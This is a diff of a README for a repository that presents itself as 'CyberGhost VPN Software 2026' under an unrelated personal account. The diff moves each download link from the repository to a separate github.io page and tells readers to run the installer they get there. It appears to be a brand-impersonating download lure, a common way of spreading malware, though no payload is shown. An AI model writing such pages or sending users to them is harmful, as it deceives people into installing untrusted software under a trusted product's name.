@@ -1,6 +1,6 @@
 # 🔒 CyberGhost-VPN-Software-2026 - Your Ultimate Privacy and Speed Solution
 
-[![Download CyberGhost VPN](https://img.shields.io/badge/Download-CyberGhost_VPN_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://github.com/mearstoneloveapple325/CyberGhost-VPN-Software-2026)
+[![Download CyberGhost VPN](https://img.shields.io/badge/Download-CyberGhost_VPN_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50)](https://mearstoneloveapple325.github.io)
 
 ## 🛡️ What Is CyberGhost VPN?
 
@@ -32,7 +32,7 @@ Getting CyberGhost up and running is quick and easy. Follow these simple instruc
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/mearstoneloveapple325/CyberGhost-VPN-Software-2026](https://github.com/mearstoneloveapple325/CyberGhost-VPN-Software-2026)**
+Visit this link to download the application: **[https://mearstoneloveapple325.github.io](https://mearstoneloveapple325.github.io)**
 
 Click the download button on that page to get the installer file saved to your computer. Your browser will show you where the file has been saved, usually in your "Downloads" folder.
 
@@ -106,7 +106,7 @@ Join millions of satisfied users who browse with confidence. Download CyberGhost
 
 ## 📦 Final Checklist Before You Go
 
-- ✅ [Download the application](https://github.com/mearstoneloveapple325/CyberGhost-VPN-Software-2026)
+- ✅ [Download the application](https://mearstoneloveapple325.github.io)
 - ✅ Run the setup installer
 - ✅ Launch CyberGhost from your desktop
 - ✅ Click the power button to connect
